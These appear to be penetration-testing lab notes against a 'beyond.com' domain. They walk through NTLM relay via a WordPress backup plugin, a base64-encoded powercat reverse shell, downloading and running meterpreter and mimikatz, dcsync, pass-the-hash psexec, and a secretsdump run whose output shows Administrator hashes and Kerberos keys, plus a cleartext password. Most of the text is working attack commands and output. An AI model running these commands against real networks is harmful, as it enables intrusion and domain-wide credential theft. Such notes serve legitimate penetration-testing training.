* Option 1: Upload a malicious wp plugin with reverse shell
* Option 2: Migration Backup is enabled, modify path may force authentcation and ntlmrelayx the hash to mailsrv1 where beccy has a session

Attack Plan

* Change the Backup Path to Attacker IP
* Use `impacket-ntlmrelayx` to relay local admin ntlm to mailsrv1 
* Spawn a PS reverse shell with local administrator on mailsrv1
* Steal credentials from AD Admin beccy using mimikatz

```shell
# Migration Backup Path
Backup directory path: C:\xampp\htdocs\wordpress\wp-content\backup-migration-BV1emzfHrI

# Powercat.ps1 reverse shell
pwsh
$Shell="IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.174:8080/powercat.ps1');powercat -c 192.168.45.174 -p 5555 -ep"
$Base64Shell = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Shell))

# relay hash
# target mailsrv1
# disable http and smb2
# run powercat reverse shell on port 5555
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.202.242 -c "powershell -w hidden -enc JABjAGwAaQ..."

nc -nlvp 5555
```

```plain
# Force Auth by saving Migration Backup Path
Backup directory path: //192.168.45.174/noexist
```

## Get Access to the Domain Controller

* Start meterpreter session on mailsrv1
* Use **mimikatz** to steal beccys AD Admin credentials

```powershell
cd c:\
iwr -uri http://...:8080/met.exe -out met.exe
./met.exe
```

```shell
sessions -i 2
shell
powershell

```

```
iwr -uri http://192.168.54.200:8080/mimikatz.exe -Outfile mimikatz.exe
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
Password : Nifty...

token::elevate
lsadump::dcsync /user:beyond.com\Administrator
```

proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.159.240
whoami



proxychains impacket-secretsdump -just-dc-user Administrator beyond.com/beccy:"NiftyTopekaDevolve6655\!#\!"@172.16.159.240


proxychains impacket-secretsdump -just-dc-user Administrator beyond.com/beccy:"NiftyTopekaDevolve6655\!#\!"@172.16.159.240
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.159.240:445  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.159.240:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.159.240:49667  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8480fa6ca85394df498139fe5ca02b95:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e8d0b7aa861dffd552fcfa803856fd0cdf909fa6966eb450d583a7bcaef1263f
Administrator:aes128-cts-hmac-sha1-96:b0c54be1f0740f4731a09152aea71669
Administrator:des-cbc-md5:677f5249132c3b68
